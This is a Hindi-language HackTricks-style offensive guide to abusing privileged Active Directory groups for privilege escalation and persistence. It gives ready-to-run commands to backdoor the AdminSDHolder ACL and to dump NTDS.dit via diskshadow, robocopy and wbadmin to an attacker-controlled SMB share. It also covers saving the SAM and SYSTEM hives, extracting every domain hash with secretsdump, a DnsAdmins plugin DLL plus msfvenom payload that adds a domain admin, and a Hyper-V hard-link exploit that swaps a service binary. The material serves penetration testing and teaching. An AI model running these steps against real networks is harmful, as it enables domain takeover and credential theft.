# विशेषाधिकार प्राप्त समूह

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग तरकीबें साझा करें।

</details>

## प्रशासन विशेषाधिकारों वाले ज्ञात समूह

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

सुरक्षा मूल्यांकन के दौरान एकाधिक हमले के वेक्टरों को जोड़ते समय अन्य खाता सदस्यता और एक्सेस टोकन विशेषाधिकार भी उपयोगी हो सकते हैं।

## Account Operators <a href="#account-operators" id="account-operators"></a>

* डोमेन पर गैर प्रशासक खातों और समूहों को बनाने की अनुमति देता है
* DC में स्थानीय रूप से लॉग इन करने की अनुमति देता है

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
ध्यान दें कि 'spotless' उपयोगकर्ता की सदस्यता:

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

हालांकि, हम अभी भी नए उपयोगकर्ता जोड़ सकते हैं:

![](../../.gitbook/assets/a2.png)

साथ ही DC01 में स्थानीय रूप से लॉगिन कर सकते हैं:

![](../../.gitbook/assets/a3.png)

## AdminSDHolder समूह

**AdminSDHolder** ऑब्जेक्ट की एक्सेस कंट्रोल लिस्ट (ACL) का उपयोग एक्टिव डायरेक्टरी में सभी "सुरक्षित समूहों" और उनके सदस्यों को **अनुमतियां** **कॉपी** करने के लिए एक टेम्पलेट के रूप में किया जाता है। सुरक्षित समूहों में विशेषाधिकार प्राप्त समूह जैसे कि डोमेन एडमिन्स, एडमिनिस्ट्रेटर्स, एंटरप्राइज एडमिन्स, और स्कीमा एडमिन्स शामिल हैं।\
डिफ़ॉल्ट रूप से, इस समूह की ACL को सभी "सुरक्षित समूहों" के अंदर कॉपी किया जाता है। यह इन महत्वपूर्ण समूहों में जानबूझकर या आकस्मिक परिवर्तनों से बचने के लिए किया जाता है। हालांकि, यदि कोई हमलावर समूह **AdminSDHolder** की ACL को संशोधित करता है, उदाहरण के लिए एक सामान्य उपयोगकर्ता को पूर्ण अनुमतियां देता है, तो यह उपयोगकर्ता सुरक्षित समूह के अंदर सभी समूहों पर पूर्ण अनुमतियां प्राप्त कर लेगा (एक घंटे में)।\
और यदि कोई इस उपयोगकर्ता को डोमेन एडमिन्स से हटाने की कोशिश करता है (उदाहरण के लिए) एक घंटे या उससे कम समय में, उपयोगकर्ता फिर से समूह में वापस आ जाएगा।

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
एक उपयोगकर्ता को **AdminSDHolder** समूह में जोड़ें:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
जांचें कि क्या उपयोगकर्ता **Domain Admins** समूह के अंदर है:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
यदि आप एक घंटे की प्रतीक्षा नहीं करना चाहते हैं, तो आप एक PS स्क्रिप्ट का उपयोग करके तुरंत रिस्टोर करवा सकते हैं: [https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**ired.team में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD रीसायकल बिन**

यह समूह आपको हटाए गए AD ऑब्जेक्ट को पढ़ने की अनुमति देता है। वहां कुछ रसदार जानकारी मिल सकती है:
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### डोमेन कंट्रोलर पहुँच

ध्यान दें कि हम वर्तमान सदस्यता के साथ DC पर फाइलों तक कैसे पहुँच नहीं सकते हैं:

![](../../.gitbook/assets/a4.png)

हालांकि, यदि उपयोगकर्ता `Server Operators` का सदस्य है:

![](../../.gitbook/assets/a5.png)

कहानी बदल जाती है:

![](../../.gitbook/assets/a6.png)

### प्रिवेस्क <a href="#backup-operators" id="backup-operators"></a>

सेवा पर अनुमतियों की जाँच के लिए Sysinternals से [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) या `sc` का उपयोग करें।
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
यह पुष्टि करता है कि Server Operators समूह के पास [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) पहुँच अधिकार है, जो हमें इस सेवा पर पूर्ण नियंत्रण प्रदान करता है।
आप इस सेवा का दुरुपयोग करके [**सेवा को मनमाने आदेश निष्पादित करने के लिए प्रेरित कर सकते हैं**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) और विशेषाधिकार बढ़ा सकते हैं।

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators` सदस्यता के समान, यदि हम `Backup Operators` के सदस्य हैं तो हम **`DC01` फाइल सिस्टम तक पहुँच सकते हैं**।

यह इसलिए है क्योंकि यह समूह अपने **सदस्यों** को [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5) विशेषाधिकार प्रदान करता है। **SeBackupPrivilege** हमें किसी भी फोल्डर को **पार करने और सूची** बनाने की अनुमति देता है। यह हमें किसी फोल्डर से **फाइल की प्रतिलिपि बनाने** की अनुमति देगा, भले ही अन्य कोई अनुमति न दे रहा हो। हालांकि, इस अनुमति का दुरुपयोग करके फाइल की प्रतिलिपि बनाने के लिए [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* फ्लैग का उपयोग करना चाहिए। इसलिए, विशेष उपकरणों की आवश्यकता होती है।

इस उद्देश्य के लिए आप [**ये स्क्रिप्ट्स**](https://github.com/giuliano108/SeBackupPrivilege)** का उपयोग कर सकते हैं।**

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **स्थानीय हमला**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### AD हमला

उदाहरण के लिए, आप सीधे डोमेन कंट्रोलर फाइल सिस्टम तक पहुँच सकते हैं:

![](../../.gitbook/assets/a7.png)

आप इस पहुँच का दुरुपयोग **`NTDS.dit`** एक्टिव डायरेक्टरी डेटाबेस को **चुराने** के लिए कर सकते हैं ताकि डोमेन में सभी यूजर और कंप्यूटर ऑब्जेक्ट्स के सभी **NTLM हैशेज** प्राप्त कर सकें।

#### diskshadow.exe का उपयोग करके NTDS.dit डंप करना

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) का उपयोग करके आप **`C` ड्राइव** की एक शैडो कॉपी **बना सकते हैं** और उदाहरण के लिए `F` ड्राइव में भी। फिर, आप इस शैडो कॉपी से `NTDS.dit` फाइल को चुरा सकते हैं क्योंकि यह सिस्टम द्वारा उपयोग में नहीं होगी:
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
लोकल अटैक की तरह, आप अब विशेषाधिकार प्राप्त फाइल **`NTDS.dit`** की प्रतिलिपि बना सकते हैं:
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
फाइलों को कॉपी करने का एक और तरीका है [**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)** का उपयोग करना:**
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
तब, आप आसानी से **SYSTEM** और **SAM** को **चुरा** सकते हैं:
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
अंत में आप **`NTDS.dit`** से **सभी हैशेज प्राप्त कर सकते हैं**:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### wbadmin.exe का उपयोग करके NTDS.dit डंप करना

wbadmin.exe का उपयोग diskshadow.exe के समान है, wbadmin.exe उपकरण एक कमांड लाइन उपयोगिता है जो Windows में बनाई गई है, Windows Vista/Server 2008 से शुरू होकर।

इसका उपयोग करने से पहले, आपको हमलावर मशीन पर [**smb सर्वर के लिए ntfs फाइलसिस्टम सेटअप**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) करना होगा।

जब आप smb सर्वर सेटअप कर लेते हैं, तो आपको लक्ष्य मशीन पर smb क्रेडेंशियल को कैश करना होगा:
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
यदि कोई त्रुटि नहीं है, तो इसका उपयोग करने के लिए wbadmin.exe का प्रयोग करें:
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
यदि यह सफल होता है, तो यह `C:\ntds.dit` में डंप कर देगा।

[डेमो वीडियो आईपीपीएसईसी के साथ](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

जो उपयोगकर्ता **DNSAdmins** समूह का सदस्य है या एक DNS सर्वर ऑब्जेक्ट के लिए **लिखने की अनुमतियां** रखता है, वह **DNS सर्वर** पर **SYSTEM** विशेषाधिकारों के साथ एक **मनमानी DLL** लोड कर सकता है।\
यह बहुत दिलचस्प है क्योंकि **डोमेन कंट्रोलर्स** का उपयोग **DNS सर्वरों** के रूप में बहुत बार किया जाता है।

इस [**पोस्ट**](https://adsecurity.org/?p=4064) में दिखाया गया है, जब DNS एक डोमेन कंट्रोलर पर चलाया जाता है (जो बहुत आम है), तो निम्नलिखित हमला किया जा सकता है:

* DNS प्रबंधन RPC के माध्यम से किया जाता है
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) हमें DLL के पथ की **शून्य सत्यापन** के साथ एक कस्टम **DLL** **लोड** करने की अनुमति देता है। यह कमांड लाइन से `dnscmd` टूल के साथ किया जा सकता है
* जब **`DnsAdmins`** समूह का एक सदस्य नीचे दिए गए **`dnscmd`** कमांड को चलाता है, तो `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` रजिस्ट्री कुंजी भर जाती है
* जब **DNS सेवा को पुनः आरंभ किया जाता है**, इस पथ में **DLL** **लोड** की जाएगी (यानी, एक नेटवर्क शेयर जिसे डोमेन कंट्रोलर के मशीन खाते तक पहुँच हो सकती है)
* एक हमलावर एक **कस्टम DLL लोड करके रिवर्स शेल प्राप्त कर सकता है** या यहां तक कि Mimikatz जैसे टूल को DLL के रूप में लोड करके क्रेडेंशियल्स डंप कर सकता है।

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### मनमानी DLL निष्पादित करें

यदि आपके पास **DNSAdmins समूह** में एक उपयोगकर्ता है, तो आप **DNS सर्वर को SYSTEM विशेषाधिकारों के साथ मनमानी DLL लोड करने के लिए बना सकते हैं** (DNS सेवा `NT AUTHORITY\SYSTEM` के रूप में चलती है)। आप DNS सर्वर को **स्थानीय या दूरस्थ** (SMB द्वारा साझा की गई) DLL फ़ाइल निष्पादित करते हुए लोड कर सकते हैं:
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
एक मान्य DLL का उदाहरण आप [https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL) में पा सकते हैं। मैं `DnsPluginInitialize` फंक्शन के कोड को इस प्रकार बदलूंगा:
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
या आप msfvenom का उपयोग करके एक dll जनरेट कर सकते हैं:
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
तो, जब **DNSservice** शुरू या पुनः आरंभ होती है, एक नया उपयोगकर्ता बनाया जाएगा।

DNSAdmin समूह के अंदर एक उपयोगकर्ता होने के बावजूद आप **डिफ़ॉल्ट रूप से DNS सेवा को रोक नहीं सकते और पुनः आरंभ नहीं कर सकते।** लेकिन आप हमेशा कोशिश कर सकते हैं:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**ired.team में इस प्रिविलेज एस्केलेशन के बारे में और जानें।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

इस [**पोस्ट**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) में विस्तार से बताया गया है, `Mimikatz` टूल के निर्माता द्वारा [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) का उपयोग करके [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) **** फाइल को **संशोधित** करके कमांड एक्जीक्यूशन प्राप्त करना संभव है, जिससे **रिवर्स शेल** वन-लाइनर या हमारी पसंद का कोई अन्य कमांड निष्पादित हो सकता है।

### WPAD रिकॉर्ड के लिए MitM

DnsAdmins समूह की विशेषाधिकारों का **दुरुपयोग** करने का एक और तरीका **WPAD रिकॉर्ड** बनाना है। इस समूह की सदस्यता हमें [ग्लोबल क्वेरी ब्लॉक सुरक्षा को अक्षम करने](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) का अधिकार देती है, जो डिफ़ॉल्ट रूप से इस हमले को ब्लॉक करती है। सर्वर 2008 ने पहली बार DNS सर्वर पर ग्लोबल क्वेरी ब्लॉक सूची में जोड़ने की क्षमता पेश की। डिफ़ॉल्ट रूप से, वेब प्रॉक्सी ऑटोमैटिक डिस्कवरी प्रोटोकॉल (WPAD) और इंट्रा-साइट ऑटोमैटिक टनल एड्रेसिंग प्रोटोकॉल (ISATAP) ग्लोबल क्वेरी ब्लॉक सूची में होते हैं। ये प्रोटोकॉल हाइजैकिंग के लिए काफी संवेदनशील होते हैं, और कोई भी डोमेन उपयोगकर्ता इन नामों वाली कंप्यूटर ऑब्जेक्ट या DNS रिकॉर्ड बना सकता है।

**ग्लोबल क्वेरी** ब्लॉक सूची को अक्षम करने और **WPAD रिकॉर्ड** बनाने के बाद, **हर मशीन** जो WPAD को डिफ़ॉल्ट सेटिंग्स के साथ चला रही है, उसका **ट्रैफिक हमारी हमला मशीन के माध्यम से प्रॉक्सी किया जाएगा**। हम \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **या** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **जैसे टूल का उपयोग करके ट्रैफिक स्पूफिंग कर सकते हैं**, और पासवर्ड हैशेज को कैप्चर करने और उन्हें ऑफ़लाइन क्रैक करने या SMBRelay हमला करने का प्रयास कर सकते हैं।

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## इवेंट लॉग रीडर्स

[**इवेंट लॉग रीडर्स**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) **** समूह के सदस्यों को **इवेंट लॉग्स तक पहुंचने की अनुमति** होती है (जैसे कि नई प्रक्रिया निर्माण लॉग्स)। लॉग्स में **संवेदनशील जानकारी** मिल सकती है। आइए देखें कि लॉग्स को कैसे देखा जाए:
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows अनुमतियाँ

सदस्यों को **डोमेन ऑब्जेक्ट पर DACL लिखने की क्षमता** प्रदान की जाती है। एक हमलावर इसका दुरुपयोग करके **एक उपयोगकर्ता को** [**DCSync**](dcsync.md) विशेषाधिकार देने के लिए कर सकता है।\
यदि Microsoft Exchange AD पर्यावरण में स्थापित है, तो इस समूह के सदस्य के रूप में उपयोगकर्ता खातों और यहां तक कि कंप्यूटरों को पाया जाना सामान्य है।

यह [**GitHub रेपो**](https://github.com/gdedrouas/Exchange-AD-Privesc) कुछ **तकनीकों** को समझाता है जिनका उपयोग करके इस समूह की अनुमतियों का दुरुपयोग करके **विशेषाधिकार बढ़ाने** के लिए किया जा सकता है।
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V प्रशासक

[**Hyper-V प्रशासक**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) समूह को [Hyper-V सुविधाओं](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines) की पूरी पहुंच होती है। यदि **डोमेन कंट्रोलर्स** को **वर्चुअलाइज़** किया गया है, तो **वर्चुअलाइज़ेशन प्रशासकों** को **डोमेन प्रशासकों** के रूप में माना जाना चाहिए। वे आसानी से **जीवित डोमेन कंट्रोलर की एक क्लोन बना सकते हैं** और वर्चुअल **डिस्क** को ऑफलाइन **माउंट** करके **`NTDS.dit`** फाइल प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं के लिए NTLM पासवर्ड हैशेज निकाल सकते हैं।

इस [ब्लॉग](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/) पर भी अच्छी तरह से दस्तावेज़ीकरण किया गया है कि एक वर्चुअल मशीन को **हटाने** पर, `vmms.exe` संबंधित **`.vhdx` फाइल** पर **मूल फाइल अनुमतियों को पुनःस्थापित** करने का प्रयास करता है और वह `NT AUTHORITY\SYSTEM` के रूप में ऐसा करता है, उपयोगकर्ता की नकल किए बिना। हम **`.vhdx`** फाइल को **हटा सकते हैं** और इस फाइल को एक **सुरक्षित SYSTEM फाइल** की ओर इंगित करने के लिए एक मूल **हार्ड लिंक बना** सकते हैं, और आपको इस पर पूरी अनुमतियां दी जाएंगी।

यदि ऑपरेटिंग सिस्टम [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) या [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841) के लिए संवेदनशील है, तो हम इसका उपयोग करके SYSTEM विशेषाधिकार प्राप्त कर सकते हैं। अन्यथा, हम **सर्वर पर एक ऐसे एप्लिकेशन का लाभ उठा सकते हैं जिसमें SYSTEM के संदर्भ में चलने वाली एक सेवा स्थापित है**, जिसे अधिकारहीन उपयोगकर्ताओं द्वारा शुरू किया जा सकता है।

### **शोषण उदाहरण**

इसका एक उदाहरण **Firefox** है, जो **`Mozilla Maintenance Service`** स्थापित करता है। हम [इस शोषण](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (NT हार्ड लिंक के लिए एक प्रमाण-संकल्प) को अपडेट कर सकते हैं ताकि हमारे वर्तमान उपयोगकर्ता को नीचे दी गई फाइल पर पूरी अनुमतियां प्रदान की जा सकें:
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **फाइल का स्वामित्व लेना**

PowerShell स्क्रिप्ट चलाने के बाद, हमें **इस फाइल पर पूर्ण नियंत्रण मिल जाना चाहिए और हम इसका स्वामित्व ले सकते हैं**।
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Mozilla Maintenance Service शुरू करना**

इसके बाद, हम इस फाइल को **दुर्भावनापूर्ण `maintenanceservice.exe`** से बदल सकते हैं, मेंटेनेंस **सर्विस को शुरू** कर सकते हैं, और SYSTEM के रूप में कमांड निष्पादन प्राप्त कर सकते हैं।
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
इस वेक्टर को मार्च 2020 विंडोज सुरक्षा अपडेट्स द्वारा कम किया गया है, जिसने हार्ड लिंक्स से संबंधित व्यवहार में परिवर्तन किया है।
{% endhint %}

## संगठन प्रबंधन

यह समूह **Microsoft Exchange** स्थापित होने वाले पर्यावरणों में भी होता है।\
इस समूह के सदस्य **सभी** डोमेन उपयोगकर्ताओं के **मेलबॉक्स** तक **पहुँच** सकते हैं।\
इस समूह को `Microsoft Exchange Security Groups` नामक OU का **पूर्ण नियंत्रण** भी होता है, जिसमें समूह [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (इस समूह का दुरुपयोग करके privesc कैसे करें, इसके लिए लिंक का अनुसरण करें) शामिल है।

## प्रिंट ऑपरेटर्स

इस समूह के सदस्यों को निम्नलिखित अनुमतियाँ दी जाती हैं:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **डोमेन कंट्रोलर पर स्थानीय रूप से लॉग ऑन करें** और इसे बंद करें
* डोमेन कंट्रोलर से जुड़े **प्रिंटर्स को प्रबंधित**, बनाने, साझा करने और हटाने की अनुमतियाँ

{% hint style="warning" %}
यदि कमांड `whoami /priv`, एक अनुन्नत संदर्भ से **`SeLoadDriverPrivilege`** नहीं दिखाता है, तो आपको UAC को बायपास करने की आवश्यकता है।
{% endhint %}

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
SeLoadDriverPrivilege का दुरुपयोग करके privesc कैसे करें, इस पृष्ठ पर जांचें:

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## रिमोट डेस्कटॉप यूजर्स

इस समूह के सदस्य RDP के माध्यम से पीसी तक पहुँच सकते हैं।\
समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
अधिक जानकारी के लिए **RDP**:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## रिमोट प्रबंधन उपयोगकर्ता

इस समूह के सदस्य **WinRM** के माध्यम से पीसी तक पहुँच सकते हैं।
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** के बारे में अधिक जानकारी:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## सर्वर ऑपरेटर्स <a href="#server-operators" id="server-operators"></a>

इस सदस्यता से उपयोगकर्ताओं को निम्नलिखित विशेषाधिकारों के साथ डोमेन कंट्रोलर्स को कॉन्फ़िगर करने की अनुमति मिलती है:

* स्थानीय रूप से लॉग ऑन करने की अनुमति
* फाइलों और निर्देशिकाओं का बैकअप लेना
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) और [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* सिस्टम का समय बदलना
* समय क्षेत्र बदलना
* दूरस्थ सिस्टम से जबरन शटडाउन करना
* फाइलों और निर्देशिकाओं को पुनर्स्थापित करना
* सिस्टम को शटडाउन करना
* स्थानीय सेवाओं का नियंत्रण

समूह के **सदस्यों** को प्राप्त करें:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## संदर्भ <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से नायक तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
